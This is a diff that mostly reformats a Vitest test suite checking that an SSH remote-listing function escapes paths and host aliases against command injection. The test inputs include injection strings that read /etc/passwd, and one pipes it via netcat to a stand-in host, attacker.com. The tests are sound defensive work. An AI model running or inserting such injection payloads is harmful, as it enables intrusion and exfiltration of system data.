@@ -1,10 +1,7 @@
-import { describe, it, expect, vi } from "vitest";
+import { describe, it, expect, vi, beforeEach } from "vitest";
 import { SSHHostConfig } from "../types/server";
 import { executeRemoteLs } from "./ssh";
 import { exec } from "child_process";
-import { promisify } from "util";
-
-const execAsync = promisify(exec);
 
 // Mock the exec function to capture commands
 vi.mock("child_process", () => {
@@ -33,11 +30,13 @@ describe("SSH Remote Listing", () => {
 
       // Mock exec to capture the command
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        // Return success
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          // Return success
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, maliciousPath);
 
@@ -53,17 +52,21 @@ describe("SSH Remote Listing", () => {
       const maliciousPath = "/tmp/test | cat /etc/passwd";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, maliciousPath);
 
       // The malicious command should be escaped
       // The path is escaped and then the entire remote command is escaped
       expect(capturedCommand).toMatch(/\/tmp\/test \| cat \/etc\/passwd/);
-      expect(capturedCommand).toMatch(/'ls -lAh .*\/tmp\/test \| cat \/etc\/passwd.*'/);
+      expect(capturedCommand).toMatch(
+        /'ls -lAh .*\/tmp\/test \| cat \/etc\/passwd.*'/,
+      );
     });
 
     it("should escape hostAlias to prevent command injection", async () => {
@@ -73,10 +76,12 @@ describe("SSH Remote Listing", () => {
       };
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(maliciousHostConfig, "/remote/path");
 
@@ -88,27 +93,33 @@ describe("SSH Remote Listing", () => {
       const pathWithSpaces = "/remote/path with spaces";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, pathWithSpaces);
 
       // Paths with spaces should be properly escaped
       // The path is escaped and then the entire remote command is escaped
       expect(capturedCommand).toMatch(/\/remote\/path with spaces/);
-      expect(capturedCommand).toMatch(/'ls -lAh .*\/remote\/path with spaces.*'/);
+      expect(capturedCommand).toMatch(
+        /'ls -lAh .*\/remote\/path with spaces.*'/,
+      );
     });
 
     it("should handle paths with single quotes", async () => {
       const pathWithQuotes = "/remote/file'name.txt";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, pathWithQuotes);
 
@@ -121,30 +132,39 @@ describe("SSH Remote Listing", () => {
     });
 
     it("should escape complex injection attempts", async () => {
-      const complexInjection = "/tmp/test; cat /etc/passwd | nc attacker.com 1234";
+      const complexInjection =
+        "/tmp/test; cat /etc/passwd | nc attacker.com 1234";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, complexInjection);
 
       // The entire malicious string should be escaped as a single argument
       // The path is escaped and then the entire remote command is escaped
-      expect(capturedCommand).toMatch(/\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234/);
-      expect(capturedCommand).toMatch(/'ls -lAh .*\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234.*'/);
+      expect(capturedCommand).toMatch(
+        /\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234/,
+      );
+      expect(capturedCommand).toMatch(
+        /'ls -lAh .*\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234.*'/,
+      );
     });
 
     it("should allow tilde expansion for paths starting with ~/", async () => {
       const tildePath = "~/Desktop/subdir";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, tildePath);
 
@@ -171,10 +191,12 @@ describe("SSH Remote Listing", () => {
       const tildePath = "~";
 
       let capturedCommand = "";
-      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
-        capturedCommand = command;
-        callback(null, { stdout: "total 0\n", stderr: "" });
-      });
+      (exec as any).mockImplementation(
+        (command: string, options: any, callback: any) => {
+          capturedCommand = command;
+          callback(null, { stdout: "total 0\n", stderr: "" });
+        },
+      );
 
       await executeRemoteLs(mockHostConfig, tildePath);
 
